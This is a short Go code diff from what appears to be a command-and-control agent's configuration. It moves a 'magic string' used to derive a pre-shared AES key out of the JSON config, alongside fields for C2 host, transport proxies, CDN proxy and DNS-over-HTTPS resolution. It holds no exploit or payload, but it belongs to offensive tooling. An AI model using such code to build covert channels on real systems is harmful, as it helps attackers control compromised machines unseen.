@@ -31,7 +31,7 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
 	LibPath = config_to_write.AgentRoot + "/lib"
 	DefaultShell = config_to_write.UtilsPath + "/bash"
-	AESKey = GenAESKey("Your Pre Shared AES Key: " + config_to_write.MagicString)
+	AESKey = GenAESKey("Your Pre Shared AES Key: " + MagicString)
 
 	return
 }
@@ -52,7 +52,6 @@ type Config struct {
 	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // seconds, set max to 0 to disable
 	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
 	CA                   string `json:"ca"`                     // CA cert from server side
-	MagicString          string `json:"magic"`                  // MagicString as separator/password
 	AgentProxy           string `json:"agent_proxy"`            // proxy for C2 transport
 	CDNProxy             string `json:"cdn_proxy"`              // websocket proxy, see go-cdn2proxy
 	DoHServer            string `json:"doh_server"`             // DNS over HTTPS server, for name resolving
